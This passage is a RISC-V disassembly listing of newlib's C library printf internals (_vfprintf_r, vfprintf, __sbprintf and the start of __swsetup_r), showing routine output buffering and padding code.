   11aa0:	879a                	mv	a5,t1
   11aa2:	bfb5                	j	11a1e <_vfprintf_r+0x1010>
   11aa4:	000d0b1b          	sext.w	s6,s10
   11aa8:	01aa5463          	ble	s10,s4,11ab0 <_vfprintf_r+0x10a2>
   11aac:	000a0b1b          	sext.w	s6,s4
   11ab0:	03605a63          	blez	s6,11ae4 <_vfprintf_r+0x10d6>
   11ab4:	975a                	add	a4,a4,s6
   11ab6:	ea3a                	sd	a4,272(sp)
   11ab8:	10812703          	lw	a4,264(sp)
   11abc:	009cb023          	sd	s1,0(s9)
   11ac0:	016cb423          	sd	s6,8(s9)
   11ac4:	0017069b          	addiw	a3,a4,1
   11ac8:	10d12423          	sw	a3,264(sp)
   11acc:	471d                	li	a4,7
   11ace:	0cc1                	addi	s9,s9,16
   11ad0:	00d75a63          	ble	a3,a4,11ae4 <_vfprintf_r+0x10d6>
   11ad4:	0210                	addi	a2,sp,256
   11ad6:	85ca                	mv	a1,s2
   11ad8:	854e                	mv	a0,s3
   11ada:	6a8050ef          	jal	ra,17182 <__sprint_r>
   11ade:	48051963          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11ae2:	8cd6                	mv	s9,s5
   11ae4:	875a                	mv	a4,s6
   11ae6:	000b5363          	bgez	s6,11aec <_vfprintf_r+0x10de>
   11aea:	4701                	li	a4,0
   11aec:	40ed0b3b          	subw	s6,s10,a4
   11af0:	05605563          	blez	s6,11b3a <_vfprintf_r+0x112c>
   11af4:	66e9                	lui	a3,0x1a
   11af6:	4841                	li	a6,16
   11af8:	43068d93          	addi	s11,a3,1072 # 1a430 <zeroes.4441>
   11afc:	489d                	li	a7,7
   11afe:	10812603          	lw	a2,264(sp)
   11b02:	01bcb023          	sd	s11,0(s9)
   11b06:	6752                	ld	a4,272(sp)
   11b08:	0016059b          	addiw	a1,a2,1
   11b0c:	862e                	mv	a2,a1
   11b0e:	010c8513          	addi	a0,s9,16
   11b12:	15684263          	blt	a6,s6,11c56 <_vfprintf_r+0x1248>
   11b16:	016cb423          	sd	s6,8(s9)
   11b1a:	9b3a                	add	s6,s6,a4
   11b1c:	ea5a                	sd	s6,272(sp)
   11b1e:	10b12423          	sw	a1,264(sp)
   11b22:	471d                	li	a4,7
   11b24:	8caa                	mv	s9,a0
   11b26:	00b75a63          	ble	a1,a4,11b3a <_vfprintf_r+0x112c>
   11b2a:	0210                	addi	a2,sp,256
   11b2c:	85ca                	mv	a1,s2
   11b2e:	854e                	mv	a0,s3
   11b30:	652050ef          	jal	ra,17182 <__sprint_r>
   11b34:	42051e63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11b38:	8cd6                	mv	s9,s5
   11b3a:	40047793          	andi	a5,s0,1024
   11b3e:	01a48b33          	add	s6,s1,s10
   11b42:	c39d                	beqz	a5,11b68 <_vfprintf_r+0x115a>
   11b44:	014487b3          	add	a5,s1,s4
   11b48:	f4be                	sd	a5,104(sp)
   11b4a:	67e9                	lui	a5,0x1a
   11b4c:	43078793          	addi	a5,a5,1072 # 1a430 <zeroes.4441>
   11b50:	4d9d                	li	s11,7
   11b52:	8d3e                	mv	s10,a5
   11b54:	67a2                	ld	a5,8(sp)
   11b56:	120c1763          	bnez	s8,11c84 <_vfprintf_r+0x1276>
   11b5a:	12079663          	bnez	a5,11c86 <_vfprintf_r+0x1278>
   11b5e:	014487b3          	add	a5,s1,s4
   11b62:	0167f363          	bleu	s6,a5,11b68 <_vfprintf_r+0x115a>
   11b66:	8b3e                	mv	s6,a5
   11b68:	47ee                	lw	a5,216(sp)
   11b6a:	0147c563          	blt	a5,s4,11b74 <_vfprintf_r+0x1166>
   11b6e:	00147793          	andi	a5,s0,1
   11b72:	cf8d                	beqz	a5,11bac <_vfprintf_r+0x119e>
   11b74:	67a6                	ld	a5,72(sp)
   11b76:	6762                	ld	a4,24(sp)
   11b78:	0cc1                	addi	s9,s9,16
   11b7a:	fefcb823          	sd	a5,-16(s9)
   11b7e:	67e2                	ld	a5,24(sp)
   11b80:	fefcbc23          	sd	a5,-8(s9)
   11b84:	67d2                	ld	a5,272(sp)
   11b86:	97ba                	add	a5,a5,a4
   11b88:	ea3e                	sd	a5,272(sp)
   11b8a:	10812783          	lw	a5,264(sp)
   11b8e:	0017871b          	addiw	a4,a5,1
   11b92:	10e12423          	sw	a4,264(sp)
   11b96:	479d                	li	a5,7
   11b98:	00e7da63          	ble	a4,a5,11bac <_vfprintf_r+0x119e>
   11b9c:	0210                	addi	a2,sp,256
   11b9e:	85ca                	mv	a1,s2
   11ba0:	854e                	mv	a0,s3
   11ba2:	5e0050ef          	jal	ra,17182 <__sprint_r>
   11ba6:	3c051563          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11baa:	8cd6                	mv	s9,s5
   11bac:	4c6e                	lw	s8,216(sp)
   11bae:	94d2                	add	s1,s1,s4
   11bb0:	416484bb          	subw	s1,s1,s6
   11bb4:	418a07bb          	subw	a5,s4,s8
   11bb8:	8c3e                	mv	s8,a5
   11bba:	00f4d463          	ble	a5,s1,11bc2 <_vfprintf_r+0x11b4>
   11bbe:	00048c1b          	sext.w	s8,s1
   11bc2:	03805b63          	blez	s8,11bf8 <_vfprintf_r+0x11ea>
   11bc6:	67d2                	ld	a5,272(sp)
   11bc8:	016cb023          	sd	s6,0(s9)
   11bcc:	018cb423          	sd	s8,8(s9)
   11bd0:	97e2                	add	a5,a5,s8
   11bd2:	ea3e                	sd	a5,272(sp)
   11bd4:	10812783          	lw	a5,264(sp)
   11bd8:	0cc1                	addi	s9,s9,16
   11bda:	0017871b          	addiw	a4,a5,1
   11bde:	10e12423          	sw	a4,264(sp)
   11be2:	479d                	li	a5,7
   11be4:	00e7da63          	ble	a4,a5,11bf8 <_vfprintf_r+0x11ea>
   11be8:	0210                	addi	a2,sp,256
   11bea:	85ca                	mv	a1,s2
   11bec:	854e                	mv	a0,s3
   11bee:	594050ef          	jal	ra,17182 <__sprint_r>
   11bf2:	36051f63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11bf6:	8cd6                	mv	s9,s5
   11bf8:	87e2                	mv	a5,s8
   11bfa:	000c5363          	bgez	s8,11c00 <_vfprintf_r+0x11f2>
   11bfe:	4781                	li	a5,0
   11c00:	44ee                	lw	s1,216(sp)
   11c02:	409a04bb          	subw	s1,s4,s1
   11c06:	9c9d                	subw	s1,s1,a5
   11c08:	d0905ee3          	blez	s1,11924 <_vfprintf_r+0xf16>
   11c0c:	6b69                	lui	s6,0x1a
   11c0e:	4c41                	li	s8,16
   11c10:	430b0b13          	addi	s6,s6,1072 # 1a430 <zeroes.4441>
   11c14:	4d1d                	li	s10,7
   11c16:	10812703          	lw	a4,264(sp)
   11c1a:	016cb023          	sd	s6,0(s9)
   11c1e:	67d2                	ld	a5,272(sp)
   11c20:	0017069b          	addiw	a3,a4,1
   11c24:	8736                	mv	a4,a3
   11c26:	010c8613          	addi	a2,s9,16
   11c2a:	169c4f63          	blt	s8,s1,11da8 <_vfprintf_r+0x139a>
   11c2e:	009cb423          	sd	s1,8(s9)
   11c32:	94be                	add	s1,s1,a5
   11c34:	ea26                	sd	s1,272(sp)
   11c36:	10d12423          	sw	a3,264(sp)
   11c3a:	479d                	li	a5,7
   11c3c:	8cb2                	mv	s9,a2
   11c3e:	ced7d3e3          	ble	a3,a5,11924 <_vfprintf_r+0xf16>
   11c42:	0210                	addi	a2,sp,256
   11c44:	85ca                	mv	a1,s2
   11c46:	854e                	mv	a0,s3
   11c48:	53a050ef          	jal	ra,17182 <__sprint_r>
   11c4c:	32051263          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11c50:	18010c93          	addi	s9,sp,384
   11c54:	b9c1                	j	11924 <_vfprintf_r+0xf16>
   11c56:	0741                	addi	a4,a4,16
   11c58:	010cb423          	sd	a6,8(s9)
   11c5c:	ea3a                	sd	a4,272(sp)
   11c5e:	10c12423          	sw	a2,264(sp)
   11c62:	00b8de63          	ble	a1,a7,11c7e <_vfprintf_r+0x1270>
   11c66:	0210                	addi	a2,sp,256
   11c68:	85ca                	mv	a1,s2
   11c6a:	854e                	mv	a0,s3
   11c6c:	f8c6                	sd	a7,112(sp)
   11c6e:	f4c2                	sd	a6,104(sp)
   11c70:	512050ef          	jal	ra,17182 <__sprint_r>
   11c74:	2e051e63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11c78:	78c6                	ld	a7,112(sp)
   11c7a:	7826                	ld	a6,104(sp)
   11c7c:	8556                	mv	a0,s5
   11c7e:	3b41                	addiw	s6,s6,-16
   11c80:	8caa                	mv	s9,a0
   11c82:	bdb5                	j	11afe <_vfprintf_r+0x10f0>
   11c84:	c7d5                	beqz	a5,11d30 <_vfprintf_r+0x1322>
   11c86:	47a2                	lw	a5,8(sp)
   11c88:	37fd                	addiw	a5,a5,-1
   11c8a:	e43e                	sd	a5,8(sp)
   11c8c:	67c6                	ld	a5,80(sp)
   11c8e:	6706                	ld	a4,64(sp)
   11c90:	0cc1                	addi	s9,s9,16
   11c92:	fefcb823          	sd	a5,-16(s9)
   11c96:	6786                	ld	a5,64(sp)
   11c98:	fefcbc23          	sd	a5,-8(s9)
   11c9c:	67d2                	ld	a5,272(sp)
   11c9e:	97ba                	add	a5,a5,a4
   11ca0:	ea3e                	sd	a5,272(sp)
   11ca2:	10812783          	lw	a5,264(sp)
   11ca6:	0017871b          	addiw	a4,a5,1
   11caa:	10e12423          	sw	a4,264(sp)
   11cae:	00edda63          	ble	a4,s11,11cc2 <_vfprintf_r+0x12b4>
   11cb2:	0210                	addi	a2,sp,256
   11cb4:	85ca                	mv	a1,s2
   11cb6:	854e                	mv	a0,s3
   11cb8:	4ca050ef          	jal	ra,17182 <__sprint_r>
   11cbc:	2a051a63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11cc0:	8cd6                	mv	s9,s5
   11cc2:	6702                	ld	a4,0(sp)
   11cc4:	57a6                	lw	a5,104(sp)
   11cc6:	00074703          	lbu	a4,0(a4)
   11cca:	416787bb          	subw	a5,a5,s6
   11cce:	00e7d463          	ble	a4,a5,11cd6 <_vfprintf_r+0x12c8>
   11cd2:	0007871b          	sext.w	a4,a5
   11cd6:	02e05d63          	blez	a4,11d10 <_vfprintf_r+0x1302>
   11cda:	67d2                	ld	a5,272(sp)
   11cdc:	016cb023          	sd	s6,0(s9)
   11ce0:	00ecb423          	sd	a4,8(s9)
   11ce4:	97ba                	add	a5,a5,a4
   11ce6:	ea3e                	sd	a5,272(sp)
   11ce8:	10812783          	lw	a5,264(sp)
   11cec:	0cc1                	addi	s9,s9,16
   11cee:	0017869b          	addiw	a3,a5,1
   11cf2:	10d12423          	sw	a3,264(sp)
   11cf6:	00dddd63          	ble	a3,s11,11d10 <_vfprintf_r+0x1302>
   11cfa:	0210                	addi	a2,sp,256
   11cfc:	85ca                	mv	a1,s2
   11cfe:	854e                	mv	a0,s3
   11d00:	f8ba                	sd	a4,112(sp)
   11d02:	480050ef          	jal	ra,17182 <__sprint_r>
   11d06:	26051563          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11d0a:	7746                	ld	a4,112(sp)
   11d0c:	18010c93          	addi	s9,sp,384
   11d10:	86ba                	mv	a3,a4
   11d12:	00075363          	bgez	a4,11d18 <_vfprintf_r+0x130a>
   11d16:	4681                	li	a3,0
   11d18:	6782                	ld	a5,0(sp)
   11d1a:	4841                	li	a6,16
   11d1c:	0007c783          	lbu	a5,0(a5)
   11d20:	9f95                	subw	a5,a5,a3
   11d22:	04f04463          	bgtz	a5,11d6a <_vfprintf_r+0x135c>
   11d26:	6782                	ld	a5,0(sp)
   11d28:	0007c783          	lbu	a5,0(a5)
   11d2c:	9b3e                	add	s6,s6,a5
   11d2e:	b51d                	j	11b54 <_vfprintf_r+0x1146>
   11d30:	6782                	ld	a5,0(sp)
   11d32:	3c7d                	addiw	s8,s8,-1
   11d34:	17fd                	addi	a5,a5,-1
   11d36:	e03e                	sd	a5,0(sp)
   11d38:	bf91                	j	11c8c <_vfprintf_r+0x127e>
   11d3a:	0741                	addi	a4,a4,16
   11d3c:	01acb023          	sd	s10,0(s9)
   11d40:	010cb423          	sd	a6,8(s9)
   11d44:	ea3a                	sd	a4,272(sp)
   11d46:	10d12423          	sw	a3,264(sp)
   11d4a:	00cdde63          	ble	a2,s11,11d66 <_vfprintf_r+0x1358>
   11d4e:	0210                	addi	a2,sp,256
   11d50:	85ca                	mv	a1,s2
   11d52:	854e                	mv	a0,s3
   11d54:	fcc2                	sd	a6,120(sp)
   11d56:	f8be                	sd	a5,112(sp)
   11d58:	42a050ef          	jal	ra,17182 <__sprint_r>
   11d5c:	20051a63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11d60:	7866                	ld	a6,120(sp)
   11d62:	77c6                	ld	a5,112(sp)
   11d64:	030c                	addi	a1,sp,384
   11d66:	37c1                	addiw	a5,a5,-16
   11d68:	8cae                	mv	s9,a1
   11d6a:	10812683          	lw	a3,264(sp)
   11d6e:	6752                	ld	a4,272(sp)
   11d70:	010c8593          	addi	a1,s9,16
   11d74:	0016861b          	addiw	a2,a3,1
   11d78:	86b2                	mv	a3,a2
   11d7a:	fcf840e3          	blt	a6,a5,11d3a <_vfprintf_r+0x132c>
   11d7e:	00fcb423          	sd	a5,8(s9)
   11d82:	97ba                	add	a5,a5,a4
   11d84:	01acb023          	sd	s10,0(s9)
   11d88:	ea3e                	sd	a5,272(sp)
   11d8a:	10c12423          	sw	a2,264(sp)
   11d8e:	8cae                	mv	s9,a1
   11d90:	f8cddbe3          	ble	a2,s11,11d26 <_vfprintf_r+0x1318>
   11d94:	0210                	addi	a2,sp,256
   11d96:	85ca                	mv	a1,s2
   11d98:	854e                	mv	a0,s3
   11d9a:	3e8050ef          	jal	ra,17182 <__sprint_r>
   11d9e:	1c051963          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11da2:	18010c93          	addi	s9,sp,384
   11da6:	b741                	j	11d26 <_vfprintf_r+0x1318>
   11da8:	07c1                	addi	a5,a5,16
   11daa:	018cb423          	sd	s8,8(s9)
   11dae:	ea3e                	sd	a5,272(sp)
   11db0:	10e12423          	sw	a4,264(sp)
   11db4:	00dd5a63          	ble	a3,s10,11dc8 <_vfprintf_r+0x13ba>
   11db8:	0210                	addi	a2,sp,256
   11dba:	85ca                	mv	a1,s2
   11dbc:	854e                	mv	a0,s3
   11dbe:	3c4050ef          	jal	ra,17182 <__sprint_r>
   11dc2:	1a051763          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11dc6:	0310                	addi	a2,sp,384
   11dc8:	34c1                	addiw	s1,s1,-16
   11dca:	8cb2                	mv	s9,a2
   11dcc:	b5a9                	j	11c16 <_vfprintf_r+0x1208>
   11dce:	10812783          	lw	a5,264(sp)
   11dd2:	4605                	li	a2,1
   11dd4:	009cb023          	sd	s1,0(s9)
   11dd8:	0017869b          	addiw	a3,a5,1
   11ddc:	0705                	addi	a4,a4,1
   11dde:	87b6                	mv	a5,a3
   11de0:	010c8c13          	addi	s8,s9,16
   11de4:	01464663          	blt	a2,s4,11df0 <_vfprintf_r+0x13e2>
   11de8:	00147593          	andi	a1,s0,1
   11dec:	12058663          	beqz	a1,11f18 <_vfprintf_r+0x150a>
   11df0:	4605                	li	a2,1
   11df2:	10f12423          	sw	a5,264(sp)
   11df6:	00ccb423          	sd	a2,8(s9)
   11dfa:	ea3a                	sd	a4,272(sp)
   11dfc:	479d                	li	a5,7
   11dfe:	00d7da63          	ble	a3,a5,11e12 <_vfprintf_r+0x1404>
   11e02:	0210                	addi	a2,sp,256
   11e04:	85ca                	mv	a1,s2
   11e06:	854e                	mv	a0,s3
   11e08:	37a050ef          	jal	ra,17182 <__sprint_r>
   11e0c:	16051263          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11e10:	8c56                	mv	s8,s5
   11e12:	67a6                	ld	a5,72(sp)
   11e14:	6762                	ld	a4,24(sp)
   11e16:	0c41                	addi	s8,s8,16
   11e18:	fefc3823          	sd	a5,-16(s8)
   11e1c:	67e2                	ld	a5,24(sp)
   11e1e:	fefc3c23          	sd	a5,-8(s8)
   11e22:	67d2                	ld	a5,272(sp)
   11e24:	97ba                	add	a5,a5,a4
   11e26:	ea3e                	sd	a5,272(sp)
   11e28:	10812783          	lw	a5,264(sp)
   11e2c:	0017871b          	addiw	a4,a5,1
   11e30:	10e12423          	sw	a4,264(sp)
   11e34:	479d                	li	a5,7
   11e36:	00e7da63          	ble	a4,a5,11e4a <_vfprintf_r+0x143c>
   11e3a:	0210                	addi	a2,sp,256
   11e3c:	85ca                	mv	a1,s2
   11e3e:	854e                	mv	a0,s3
   11e40:	342050ef          	jal	ra,17182 <__sprint_r>
   11e44:	12051663          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11e48:	8c56                	mv	s8,s5
   11e4a:	754e                	ld	a0,240(sp)
   11e4c:	75ee                	ld	a1,248(sp)
   11e4e:	4601                	li	a2,0
   11e50:	4681                	li	a3,0
   11e52:	fffa0b1b          	addiw	s6,s4,-1
   11e56:	5d3060ef          	jal	ra,18c28 <__eqtf2>
   11e5a:	c12d                	beqz	a0,11ebc <_vfprintf_r+0x14ae>
   11e5c:	10812703          	lw	a4,264(sp)
   11e60:	67d2                	ld	a5,272(sp)
   11e62:	0485                	addi	s1,s1,1
   11e64:	0017069b          	addiw	a3,a4,1
   11e68:	97da                	add	a5,a5,s6
   11e6a:	009c3023          	sd	s1,0(s8)
   11e6e:	016c3423          	sd	s6,8(s8)
   11e72:	ea3e                	sd	a5,272(sp)
   11e74:	10d12423          	sw	a3,264(sp)
   11e78:	479d                	li	a5,7
   11e7a:	0c41                	addi	s8,s8,16
   11e7c:	00d7d963          	ble	a3,a5,11e8e <_vfprintf_r+0x1480>
   11e80:	0210                	addi	a2,sp,256
   11e82:	85ca                	mv	a1,s2
   11e84:	854e                	mv	a0,s3
   11e86:	2fc050ef          	jal	ra,17182 <__sprint_r>
   11e8a:	e17d                	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11e8c:	8c56                	mv	s8,s5
   11e8e:	119c                	addi	a5,sp,224
   11e90:	00fc3023          	sd	a5,0(s8)
   11e94:	67e6                	ld	a5,88(sp)
   11e96:	6766                	ld	a4,88(sp)
   11e98:	010c0c93          	addi	s9,s8,16
   11e9c:	00fc3423          	sd	a5,8(s8)
   11ea0:	67d2                	ld	a5,272(sp)
   11ea2:	97ba                	add	a5,a5,a4
   11ea4:	ea3e                	sd	a5,272(sp)
   11ea6:	10812783          	lw	a5,264(sp)
   11eaa:	0017871b          	addiw	a4,a5,1
   11eae:	10e12423          	sw	a4,264(sp)
   11eb2:	479d                	li	a5,7
   11eb4:	a6e7d8e3          	ble	a4,a5,11924 <_vfprintf_r+0xf16>
   11eb8:	8a8ff06f          	j	10f60 <_vfprintf_r+0x552>
   11ebc:	fd6059e3          	blez	s6,11e8e <_vfprintf_r+0x1480>
   11ec0:	64e9                	lui	s1,0x1a
   11ec2:	4d41                	li	s10,16
   11ec4:	43048493          	addi	s1,s1,1072 # 1a430 <zeroes.4441>
   11ec8:	4c9d                	li	s9,7
   11eca:	10812703          	lw	a4,264(sp)
   11ece:	009c3023          	sd	s1,0(s8)
   11ed2:	67d2                	ld	a5,272(sp)
   11ed4:	0017069b          	addiw	a3,a4,1
   11ed8:	8736                	mv	a4,a3
   11eda:	010c0613          	addi	a2,s8,16
   11ede:	016d4b63          	blt	s10,s6,11ef4 <_vfprintf_r+0x14e6>
   11ee2:	97da                	add	a5,a5,s6
   11ee4:	016c3423          	sd	s6,8(s8)
   11ee8:	ea3e                	sd	a5,272(sp)
   11eea:	10d12423          	sw	a3,264(sp)
   11eee:	479d                	li	a5,7
   11ef0:	8c32                	mv	s8,a2
   11ef2:	b769                	j	11e7c <_vfprintf_r+0x146e>
   11ef4:	07c1                	addi	a5,a5,16
   11ef6:	01ac3423          	sd	s10,8(s8)
   11efa:	ea3e                	sd	a5,272(sp)
   11efc:	10e12423          	sw	a4,264(sp)
   11f00:	00dcd963          	ble	a3,s9,11f12 <_vfprintf_r+0x1504>
   11f04:	0210                	addi	a2,sp,256
   11f06:	85ca                	mv	a1,s2
   11f08:	854e                	mv	a0,s3
   11f0a:	278050ef          	jal	ra,17182 <__sprint_r>
   11f0e:	e12d                	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11f10:	8656                	mv	a2,s5
   11f12:	3b41                	addiw	s6,s6,-16
   11f14:	8c32                	mv	s8,a2
   11f16:	bf55                	j	11eca <_vfprintf_r+0x14bc>
   11f18:	00ccb423          	sd	a2,8(s9)
   11f1c:	ea3a                	sd	a4,272(sp)
   11f1e:	10d12423          	sw	a3,264(sp)
   11f22:	479d                	li	a5,7
   11f24:	bfa1                	j	11e7c <_vfprintf_r+0x146e>
   11f26:	5782                	lw	a5,32(sp)
   11f28:	5762                	lw	a4,56(sp)
   11f2a:	40e7843b          	subw	s0,a5,a4
   11f2e:	9e805ee3          	blez	s0,1192a <_vfprintf_r+0xf1c>
   11f32:	64e9                	lui	s1,0x1a
   11f34:	4b41                	li	s6,16
   11f36:	42048493          	addi	s1,s1,1056 # 1a420 <blanks.4440>
   11f3a:	4c1d                	li	s8,7
   11f3c:	10812703          	lw	a4,264(sp)
   11f40:	009cb023          	sd	s1,0(s9)
   11f44:	67d2                	ld	a5,272(sp)
   11f46:	0017069b          	addiw	a3,a4,1
   11f4a:	8736                	mv	a4,a3
   11f4c:	028b4a63          	blt	s6,s0,11f80 <_vfprintf_r+0x1572>
   11f50:	008cb423          	sd	s0,8(s9)
   11f54:	943e                	add	s0,s0,a5
   11f56:	ea22                	sd	s0,272(sp)
   11f58:	10d12423          	sw	a3,264(sp)
   11f5c:	479d                	li	a5,7
   11f5e:	9cd7d6e3          	ble	a3,a5,1192a <_vfprintf_r+0xf1c>
   11f62:	0210                	addi	a2,sp,256
   11f64:	85ca                	mv	a1,s2
   11f66:	854e                	mv	a0,s3
   11f68:	21a050ef          	jal	ra,17182 <__sprint_r>
   11f6c:	9a050fe3          	beqz	a0,1192a <_vfprintf_r+0xf1c>
   11f70:	960b8663          	beqz	s7,110dc <_vfprintf_r+0x6ce>
   11f74:	85de                	mv	a1,s7
   11f76:	854e                	mv	a0,s3
   11f78:	71c000ef          	jal	ra,12694 <_free_r>
   11f7c:	960ff06f          	j	110dc <_vfprintf_r+0x6ce>
   11f80:	07c1                	addi	a5,a5,16
   11f82:	016cb423          	sd	s6,8(s9)
   11f86:	ea3e                	sd	a5,272(sp)
   11f88:	10e12423          	sw	a4,264(sp)
   11f8c:	0cc1                	addi	s9,s9,16
   11f8e:	00dc5963          	ble	a3,s8,11fa0 <_vfprintf_r+0x1592>
   11f92:	0210                	addi	a2,sp,256
   11f94:	85ca                	mv	a1,s2
   11f96:	854e                	mv	a0,s3
   11f98:	1ea050ef          	jal	ra,17182 <__sprint_r>
   11f9c:	f971                	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11f9e:	8cd6                	mv	s9,s5
   11fa0:	3441                	addiw	s0,s0,-16
   11fa2:	bf69                	j	11f3c <_vfprintf_r+0x152e>
   11fa4:	85de                	mv	a1,s7
   11fa6:	854e                	mv	a0,s3
   11fa8:	6ec000ef          	jal	ra,12694 <_free_r>
   11fac:	b26d                	j	11956 <_vfprintf_r+0xf48>
   11fae:	67d2                	ld	a5,272(sp)
   11fb0:	92078663          	beqz	a5,110dc <_vfprintf_r+0x6ce>
   11fb4:	0210                	addi	a2,sp,256
   11fb6:	85ca                	mv	a1,s2
   11fb8:	854e                	mv	a0,s3
   11fba:	1c8050ef          	jal	ra,17182 <__sprint_r>
   11fbe:	91eff06f          	j	110dc <_vfprintf_r+0x6ce>

0000000000011fc2 <vfprintf>:
   11fc2:	86b2                	mv	a3,a2
   11fc4:	862e                	mv	a2,a1
   11fc6:	85aa                	mv	a1,a0
   11fc8:	8481b503          	ld	a0,-1976(gp) # 1c200 <_impure_ptr>
   11fcc:	a43fe06f          	j	10a0e <_vfprintf_r>

0000000000011fd0 <__sbprintf>:
   11fd0:	0105d783          	lhu	a5,16(a1)
   11fd4:	b3010113          	addi	sp,sp,-1232
   11fd8:	4c813023          	sd	s0,1216(sp)
   11fdc:	9bf5                	andi	a5,a5,-3
   11fde:	00f11823          	sh	a5,16(sp)
   11fe2:	0ac5a783          	lw	a5,172(a1)
   11fe6:	842e                	mv	s0,a1
   11fe8:	4a913c23          	sd	s1,1208(sp)
   11fec:	d73e                	sw	a5,172(sp)
   11fee:	0125d783          	lhu	a5,18(a1)
   11ff2:	4b213823          	sd	s2,1200(sp)
   11ff6:	4c113423          	sd	ra,1224(sp)
   11ffa:	00f11923          	sh	a5,18(sp)
   11ffe:	799c                	ld	a5,48(a1)
   12000:	892a                	mv	s2,a0
   12002:	d402                	sw	zero,40(sp)
   12004:	f83e                	sd	a5,48(sp)
   12006:	61bc                	ld	a5,64(a1)
   12008:	858a                	mv	a1,sp
   1200a:	e0be                	sd	a5,64(sp)
   1200c:	191c                	addi	a5,sp,176
   1200e:	e03e                	sd	a5,0(sp)
   12010:	ec3e                	sd	a5,24(sp)
   12012:	40000793          	li	a5,1024
   12016:	c63e                	sw	a5,12(sp)
   12018:	d03e                	sw	a5,32(sp)
   1201a:	9f5fe0ef          	jal	ra,10a0e <_vfprintf_r>
   1201e:	84aa                	mv	s1,a0
   12020:	00054863          	bltz	a0,12030 <__sbprintf+0x60>
   12024:	858a                	mv	a1,sp
   12026:	854a                	mv	a0,s2
   12028:	384000ef          	jal	ra,123ac <_fflush_r>
   1202c:	c111                	beqz	a0,12030 <__sbprintf+0x60>
   1202e:	54fd                	li	s1,-1
   12030:	01015783          	lhu	a5,16(sp)
   12034:	0407f793          	andi	a5,a5,64
   12038:	c799                	beqz	a5,12046 <__sbprintf+0x76>
   1203a:	01045783          	lhu	a5,16(s0)
   1203e:	0407e793          	ori	a5,a5,64
   12042:	00f41823          	sh	a5,16(s0)
   12046:	4c813083          	ld	ra,1224(sp)
   1204a:	4c013403          	ld	s0,1216(sp)
   1204e:	8526                	mv	a0,s1
   12050:	4b013903          	ld	s2,1200(sp)
   12054:	4b813483          	ld	s1,1208(sp)
   12058:	4d010113          	addi	sp,sp,1232
   1205c:	8082                	ret

000000000001205e <__swsetup_r>:
   1205e:	1101                	addi	sp,sp,-32
   12060:	e426                	sd	s1,8(sp)
   12062:	84aa                	mv	s1,a0
   12064:	8481b503          	ld	a0,-1976(gp) # 1c200 <_impure_ptr>
   12068:	e822                	sd	s0,16(sp)
   1206a:	ec06                	sd	ra,24(sp)
   1206c:	842e                	mv	s0,a1
   1206e:	c509                	beqz	a0,12078 <__swsetup_r+0x1a>
   12070:	493c                	lw	a5,80(a0)
   12072:	e399                	bnez	a5,12078 <__swsetup_r+0x1a>
   12074:	450000ef          	jal	ra,124c4 <__sinit>
   12078:	01041703          	lh	a4,16(s0)
   1207c:	03071793          	slli	a5,a4,0x30
   12080:	93c1                	srli	a5,a5,0x30
   12082:	0087f693          	andi	a3,a5,8
   12086:	eea9                	bnez	a3,120e0 <__swsetup_r+0x82>
   12088:	0107f693          	andi	a3,a5,16
   1208c:	ee89                	bnez	a3,120a6 <__swsetup_r+0x48>
   1208e:	47a5                	li	a5,9
   12090:	c09c                	sw	a5,0(s1)
   12092:	04076713          	ori	a4,a4,64
   12096:	00e41823          	sh	a4,16(s0)
   1209a:	557d                	li	a0,-1
   1209c:	60e2                	ld	ra,24(sp)
   1209e:	6442                	ld	s0,16(sp)
   120a0:	64a2                	ld	s1,8(sp)
   120a2:	6105                	addi	sp,sp,32
   120a4:	8082                	ret
   120a6:	8b91                	andi	a5,a5,4
   120a8:	c795                	beqz	a5,120d4 <__swsetup_r+0x76>
   120aa:	6c2c                	ld	a1,88(s0)
   120ac:	c991                	beqz	a1,120c0 <__swsetup_r+0x62>
   120ae:	07440793          	addi	a5,s0,116
   120b2:	00f58563          	beq	a1,a5,120bc <__swsetup_r+0x5e>
   120b6:	8526                	mv	a0,s1
   120b8:	5dc000ef          	jal	ra,12694 <_free_r>
   120bc:	04043c23          	sd	zero,88(s0)
   120c0:	01045783          	lhu	a5,16(s0)
   120c4:	00042423          	sw	zero,8(s0)
   120c8:	fdb7f793          	andi	a5,a5,-37
   120cc:	00f41823          	sh	a5,16(s0)
   120d0:	6c1c                	ld	a5,24(s0)
   120d2:	e01c                	sd	a5,0(s0)
   120d4:	01045783          	lhu	a5,16(s0)
   120d8:	0087e793          	ori	a5,a5,8
   120dc:	00f41823          	sh	a5,16(s0)
   120e0:	6c1c                	ld	a5,24(s0)
   120e2:	ef89                	bnez	a5,120fc <__swsetup_r+0x9e>
   120e4:	01045783          	lhu	a5,16(s0)
   120e8:	20000713          	li	a4,512
   120ec:	2807f793          	andi	a5,a5,640
   120f0:	00e78663          	beq	a5,a4,120fc <__swsetup_r+0x9e>
   120f4:	85a2                	mv	a1,s0
   120f6:	8526                	mv	a0,s1
   120f8:	328020ef          	jal	ra,14420 <__smakebuf_r>
   120fc:	01045783          	lhu	a5,16(s0)
   12100:	0017f713          	andi	a4,a5,1
   12104:	c705                	beqz	a4,1212c <__swsetup_r+0xce>
   12106:	501c                	lw	a5,32(s0)
   12108:	00042623          	sw	zero,12(s0)
   1210c:	40f007bb          	negw	a5,a5
   12110:	d41c                	sw	a5,40(s0)
   12112:	6c1c                	ld	a5,24(s0)
   12114:	4501                	li	a0,0
   12116:	f3d9                	bnez	a5,1209c <__swsetup_r+0x3e>
   12118:	01041783          	lh	a5,16(s0)
   1211c:	0807f713          	andi	a4,a5,128
   12120:	df35                	beqz	a4,1209c <__swsetup_r+0x3e>
   12122:	0407e793          	ori	a5,a5,64
   12126:	00f41823          	sh	a5,16(s0)
